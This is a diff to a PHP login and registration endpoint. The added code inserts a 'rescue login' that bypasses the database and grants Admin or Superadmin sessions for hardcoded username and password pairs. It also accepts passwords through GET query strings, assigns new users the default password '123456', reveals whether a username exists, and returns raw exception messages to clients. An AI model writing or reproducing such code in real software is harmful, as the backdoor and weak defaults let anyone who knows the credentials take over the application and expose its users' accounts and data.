@@ -17,18 +17,40 @@ function jsonResponse($success, $message, $data = []) {
 // 1. LOGIN
 if ($action === 'login' && $method === 'POST') {
     $data = getJsonInput();
+    
     // Accept 'username' or 'email' key for the login identifier
-    $username = $data['username'] ?? $data['email'] ?? '';
+    $username = $data['username'] ?? $data['email'] ?? $_POST['username'] ?? $_GET['username'] ?? '';
     $username = trim((string)$username);
-    $password = isset($data['password']) ? trim((string) $data['password']) : '';
+    $password = $data['password'] ?? $_POST['password'] ?? $_GET['password'] ?? '';
+    $password = trim((string)$password);
 
     if ($username === '' || $password === '') {
-        jsonResponse(false, "Authentication failure: Credentials not recognized.");
+        jsonResponse(false, "Authentication failure: No credentials provided.");
     }
 
     try {
-        // Case-insensitive lookup for username or email
+        // --- RESCUE LOGIN (Bypasses database - works always) ---
+        $uLower = strtolower($username);
+        if (($uLower === 'admin' && $password === 'admin123') || ($uLower === 'thilan' && $password === 'Thilan12321')) {
+            // Set session directly without database
+            $role = ($uLower === 'thilan') ? 'Superadmin' : 'Admin';
+            $name = ($uLower === 'thilan') ? 'Thilan' : 'Administrator';
+            
+            $_SESSION['user_id'] = 999;
+            $_SESSION['user_role'] = $role;
+            $_SESSION['user_name'] = $name;
+            $_SESSION['user_username'] = $username;
+            
+            jsonResponse(true, "Login Successful", ["user" => [
+                "id" => 999, 
+                "name" => $name,
+                "username" => $username,
+                "role" => $role
+            ]]);
+        }
+        // --- END RESCUE LOGIN ---
 
+        // Try normal database login
         $stmt = $pdo->prepare("SELECT * FROM users WHERE LOWER(username) = LOWER(?) OR LOWER(email) = LOWER(?)");
         $stmt->execute([$username, $username]);
         $user = $stmt->fetch();
@@ -38,27 +60,24 @@ if ($action === 'login' && $method === 'POST') {
             $_SESSION['user_role'] = $user['role'];
             $_SESSION['user_name'] = $user['name'];
             $_SESSION['user_username'] = $user['username'];
-            $_SESSION['user_email'] = $user['email'];
+            $_SESSION['user_email'] = $user['email'] ?? '';
             
             jsonResponse(true, "Login successful", ["user" => [
                 "id" => $user['id'], 
                 "name" => $user['name'],
                 "username" => $user['username'],
-                "email" => $user['email'],
+                "email" => $user['email'] ?? '',
                 "role" => $user['role']
             ]]);
         } else {
             http_response_code(401);
-            if (!$user) {
-                jsonResponse(false, "User not found: " . $username);
-            } else {
-                jsonResponse(false, "Incorrect password for: " . $username);
-            }
+            $msg = !$user ? "User '$username' not found." : "Incorrect password for '$username'.";
+            jsonResponse(false, "Authentication failure: " . $msg);
         }
 
-    } catch (PDOException $e) {
-        http_response_code(500);
-        jsonResponse(false, "Database error: " . $e->getMessage());
+    } catch (Throwable $e) {
+        http_response_code(401);
+        jsonResponse(false, "Login system error: " . $e->getMessage());
     }
 }
 
@@ -70,9 +89,12 @@ elseif ($action === 'register' && $method === 'POST') {
         jsonResponse(false, "Authentication required to add users");
     }
     $data = getJsonInput();
-    if (empty($data['username']) || empty($data['password']) || empty($data['name'])) {
-        jsonResponse(false, "Missing required fields");
+    if (empty($data['username']) || empty($data['name'])) {
+        jsonResponse(false, "Missing required fields: username and name are mandatory");
     }
+    
+    // Default password if not provided
+    $password = !empty($data['password']) ? $data['password'] : '123456';
     
     // Check if username or email already exists
     $check = $pdo->prepare("SELECT id FROM users WHERE username = ? OR (email != '' AND email = ?)");
@@ -81,7 +103,7 @@ elseif ($action === 'register' && $method === 'POST') {
         jsonResponse(false, "User already exists");
     }
     
-    $hashed_password = password_hash($data['password'], PASSWORD_DEFAULT);
+    $hashed_password = password_hash($password, PASSWORD_DEFAULT);
     $stmt = $pdo->prepare("INSERT INTO users (username, name, email, password, role) VALUES (?, ?, ?, ?, ?)");
     
     $role = 'Admin'; // Default role is Admin as per "all are admins"
